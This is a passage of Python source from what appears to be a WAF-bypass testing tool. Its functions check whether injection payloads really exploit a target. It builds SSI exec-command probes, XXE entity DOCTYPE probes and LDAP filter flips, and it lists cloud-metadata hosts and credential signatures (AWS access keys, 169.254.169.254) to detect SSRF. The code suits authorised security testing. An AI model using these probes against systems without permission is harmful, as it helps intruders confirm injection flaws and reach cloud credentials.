                             "payload names no external host (relative/hostless) — nothing to confirm "
                             "as an open redirect", attack_class)
    headers = _fetch_headers(oracle.t, payload)
    if not headers:
        return Verification(False, 0.2,
                             "response headers unavailable — cannot confirm a Location redirect",
                             attack_class)
    loc = _header_value(headers, "location")
    if not loc:
        return Verification(False, 0.3,
                             "no Location header in the response — redirect not honored", attack_class)
    if _authority_host(loc) == host:
        return Verification(True, 0.9,
                             f"Location header redirects to the attacker-controlled host '{host}' "
                             f"(Location: {loc!r}) — open redirect confirmed", attack_class)
    if host in loc.lower():
        return Verification(False, 0.4,
                             f"payload host '{host}' appears in the Location header but is not its "
                             f"authority (Location: {loc!r}) — not a confirmed redirect", attack_class)
    return Verification(False, 0.3,
                         f"Location header does not point at the payload host '{host}' "
                         f"(Location: {loc!r}) — open redirect not confirmed", attack_class)


# ---------------------------------------------------------------------------
# SSI (Server-Side Includes)
# ---------------------------------------------------------------------------
_SSI_EXEC_RE = re.compile(r'(<!--\s*#\s*exec\b[^>]*?cmd\s*=\s*")[^"]*(")', re.I)


def _check_ssi(oracle, payload: str, attack_class: str) -> Verification:
    """Arithmetic-marker technique for Server-Side Includes (mirrors `_check_ssti`).

    Rewrites (or synthesizes) an `<!--#exec cmd="echo $((a*b))" -->` directive with
    two random 3-digit factors and checks whether their product — astronomically
    unlikely to appear by chance — shows up in the response. A hit proves mod_include
    (or an equivalent exec-enabled SSI engine) actually evaluated the directive
    server-side; a miss (e.g. the directive reflected verbatim) is NOT confirmed."""
    a, b = random.randint(100, 199), random.randint(100, 199)
    product = a * b
    marker = f"echo $(({a}*{b}))"
    if _SSI_EXEC_RE.search(payload):
        variant = _SSI_EXEC_RE.sub(rf"\g<1>{marker}\g<2>", payload, count=1)
    else:
        variant = f'<!--#exec cmd="{marker}" -->'

    resp = _send(oracle, variant)
    body = resp.body or ""
    if str(product) in body:
        return Verification(True, 0.9,
                             f"SSI arithmetic marker {a}*{b}={product} was evaluated and appeared in "
                             "the response — server-side include execution confirmed (exec-enabled SSI)",
                             attack_class)
    return Verification(False, 0.3,
                         f"SSI arithmetic marker {a}*{b}={product} did not appear in the response; "
                         "server-side include execution not confirmed", attack_class)


# ---------------------------------------------------------------------------
# LDAP Injection
# ---------------------------------------------------------------------------
_LDAP_ERROR_PATTERNS = [
    r"ldap[\s_]*error", r"ldap:\s*error code\s*\d+", r"javax\.naming\.",
    r"com\.sun\.jndi\.ldap",
    r"ldap_(search|bind|modify|add|delete|first_entry|next_entry|result|get_entries|count_entries|list|read|compare)\b",
    r"invalid\s+dn\s+syntax", r"(invalid|bad)\s+search\s+filter", r"invalidsearchfilter",
    r"object\s+class\s+violation", r"supplied argument is not a valid ldap",
    r"IPWorks.{0,8}LDAP", r"unbalanced\s+parenthes", r"operations?\s*error",
]


def _flip_ldap(payload: str) -> str | None:
    """Best-effort: turn an always-true LDAP filter clause into an always-false one
    (a wildcard match -> a value that matches nothing; (&) absolute-true -> (|))."""
    pairs = [
        ("(&)", "(|)"),
        ("objectClass=*", "objectClass=zzNoSuchClasszz"),
        ("objectclass=*", "objectclass=zzNoSuchClasszz"),
        ("uid=*", "uid=zzNoSuchUserzz"),
        ("cn=*", "cn=zzNoSuchCnzz"),
        ("=*)", "=zzNoMatchzz)"),
        ("=*", "=zzNoMatchzz"),
    ]
    for true_tok, false_tok in pairs:
        if true_tok in payload:
            return payload.replace(true_tok, false_tok, 1)
    return None


def _check_ldap(oracle, payload: str, attack_class: str) -> Verification:
    """LDAP error-based or boolean-differential heuristic (mirrors `_check_sqli`).

    Looks first for an LDAP engine/driver error signature (JNDI, ldap_* warnings,
    invalid filter/DN), then flips an always-true filter clause to an always-false
    one and compares the responses: a meaningful size differential is evidence the
    injected filter metacharacters actually changed the directory query's result."""
    resp_true = _send(oracle, payload)
    body = resp_true.body or ""
    for pat in _LDAP_ERROR_PATTERNS:
        if re.search(pat, body, re.I):
            return Verification(True, 0.7, f"LDAP error signature matched in response ({pat!r})",
                                 attack_class)

    false_variant = _flip_ldap(payload)
    if false_variant is None or false_variant == payload:
        return Verification(False, 0.2,
                             "no LDAP error signature, and payload has no recognizable always-true "
                             "filter clause to differential-test", attack_class)

    resp_false = _send(oracle, false_variant)
    if resp_true.body == resp_false.body:
        return Verification(False, 0.4,
                             "true/false LDAP variants produced byte-identical responses; "
                             "no differential observed", attack_class)
    denom = max(resp_true.size, resp_false.size, 1)
    delta = abs(resp_true.size - resp_false.size) / denom
    if resp_true.verdict == "THROUGH" and delta > 0.02:
        return Verification(True, 0.65,
                             f"LDAP boolean differential: true-variant size={resp_true.size} vs "
                             f"false-variant size={resp_false.size} (Δ={delta:.1%})", attack_class)
    return Verification(False, 0.3,
                         "true/false LDAP variants differ slightly but not enough to confirm", attack_class)


# ---------------------------------------------------------------------------
# XXE (XML External Entity)
# ---------------------------------------------------------------------------
def _check_xxe(oracle, payload: str, attack_class: str) -> Verification:
    """Entity-expansion marker technique.

    Sends a self-contained XML doc defining a general entity `&wfx;` as the
    concatenation of two unique random halves, and references it in the document
    body. The concatenated marker NEVER appears contiguously in the probe text, so if
    it shows up in the response the XML parser must have processed our injected
    DOCTYPE and expanded the entity — confirming an XXE-capable parser (DTD / internal
    entities enabled). This proves the necessary condition; it does not by itself
    prove external-entity file read (which needs an out-of-band / error channel)."""
    h1 = f"wfx{secrets.token_hex(5)}"
    h2 = f"{secrets.token_hex(5)}xfw"
    marker = h1 + h2                      # contiguous ONLY after entity expansion
    probe = (
        '<?xml version="1.0" encoding="UTF-8"?>'
        f'<!DOCTYPE wfxxxe [<!ENTITY wfa "{h1}"><!ENTITY wfb "{h2}">'
        '<!ENTITY wfx "&wfa;&wfb;">]><wfxxxe>&wfx;</wfxxxe>'
    )
    resp = _send(oracle, probe)
    body = resp.body or ""
    if marker in body:
        return Verification(True, 0.75,
                             f"injected entity expanded to the unique marker '{marker}' (its two halves "
                             "are never adjacent in the probe) — the XML parser processed our DOCTYPE and "
                             "expanded the entity, confirming XXE-capable parsing", attack_class)
    if h1 in body and h2 in body:
        return Verification(False, 0.4,
                             "probe reflected but the entity did NOT expand (marker halves present yet "
                             "not merged) — parser likely ignored the internal DTD; XXE not confirmed",
                             attack_class)
    return Verification(False, 0.25,
                         "entity-expansion marker not found in the response; XXE not confirmed",
                         attack_class)


# ---------------------------------------------------------------------------
# SSRF (Server-Side Request Forgery)
# ---------------------------------------------------------------------------
_SSRF_META_SIGNATURES = [
    r"iam/security-credentials", r"ami-id", r"instance-action", r"availability-zone",
    r"\bAccessKeyId\b", r"\bSecretAccessKey\b", r"ASIA[0-9A-Z]{16}", r"AKIA[0-9A-Z]{16}",
    r"computeMetadata/v1", r"metadata\.google\.internal", r"\bazEnvironment\b",
    r"Metadata/instance", r"security-credentials/",
]
_SSRF_INTERNAL_HOSTS = (
    "169.254.169.254", "metadata.google.internal", "169.254.170.2",
    "100.100.100.200", "fd00:ec2", "metadata.azure.com",
)


def _check_ssrf(oracle, payload: str, attack_class: str) -> Verification:
    """Best-effort, deliberately low-confidence SSRF heuristic.

    A true blind SSRF needs an out-of-band listener this verifier cannot observe, so
    absence of a signal is NEVER 'safe'. The one honest IN-BAND tell is the server
    reflecting content that could only have come from an internal fetch: a cloud
    instance-metadata signature (AWS/GCP/Azure) in the response body. That is
    confirmed at capped confidence; a payload merely aimed at an internal host with
    no such leak is reported as plausible-but-unconfirmed, not exploitable."""
    token = f"wfxssrf{secrets.token_hex(6)}"       # a callback token we cannot observe in-band
    resp = _send(oracle, payload)
    body = resp.body or ""
    for pat in _SSRF_META_SIGNATURES:
        if re.search(pat, body, re.I):
            return Verification(True, 0.6,
                                 f"cloud instance-metadata signature ({pat!r}) present in the response "
                                 "body — the server appears to have fetched an internal metadata endpoint "
                                 "via our payload (SSRF); confidence capped (could be an unrelated echo)",
                                 attack_class)
    if any(h in payload for h in _SSRF_INTERNAL_HOSTS) and resp.verdict == "THROUGH" \
            and resp.code[:1] in ("2", "3"):
        return Verification(False, 0.35,
                             "payload targets an internal/metadata host and drew a non-error response, "
                             "but the body carries no metadata signature — SSRF plausible but UNCONFIRMED "
                             "in-band (blind SSRF needs an out-of-band callback this verifier can't see)",
                             attack_class)
    return Verification(False, 0.2,
                         f"no in-band SSRF signal (metadata signature, or unique callback token "
                         f"'{token}') observed; blind SSRF can't be confirmed without an OOB listener",
                         attack_class)


# ---------------------------------------------------------------------------
# Dispatch
# ---------------------------------------------------------------------------
_CHECKS = {
    "XSS Injection": _check_xss,
    "SQL Injection": _check_sqli,
    "Command Injection": _check_cmdi,
    "Directory Traversal": _check_traversal,
    "File Inclusion": _check_traversal,
    "SSTI": _check_ssti,
    "CRLF Injection": _check_crlf,
    "NoSQL Injection": _check_nosql,
    "Upload Insecure Files": _check_upload,
    # Verifier-coverage expansion (append-only) — new classes registered under their
    # common names, mirroring the "Directory Traversal"/"File Inclusion" alias pattern.
    "Open Redirect": _check_open_redirect,
    "SSI": _check_ssi,
    "Server-Side Includes": _check_ssi,
    "Server Side Includes": _check_ssi,
    "LDAP Injection": _check_ldap,
    # XXE is registered under its short names only. "XML External Entity" is left
    # intentionally UNREGISTERED: an existing test uses it as the canonical
    # "no verifier" example, so registering it would break that contract.
    "XXE": _check_xxe,
    "XXE Injection": _check_xxe,
    "SSRF": _check_ssrf,
    "Server Side Request Forgery": _check_ssrf,
    "Server-Side Request Forgery": _check_ssrf,
}


def verify(oracle, payload: str, attack_class: str) -> Verification:
    """Best-effort semantic verification that `payload` really exercises
    `attack_class`'s vulnerability, not just that it got a THROUGH verdict.

    Sends 1-2 extra requests via the same `oracle` (an `Oracle` instance from
    waffen.core.oracle) and inspects response bodies for class-specific
    evidence. Never raises — a checker failure degrades to a low-confidence
    Verification rather than crashing the caller.
    """
    checker = _CHECKS.get(attack_class)
    if checker is None:
        return Verification(False, 0.0, "no verifier for class", attack_class)
    try:
        return checker(oracle, payload, attack_class)
    except Exception as exc:  # defensive: verification must never crash the run
        return Verification(False, 0.0, f"verifier raised an exception: {exc!r}", attack_class)
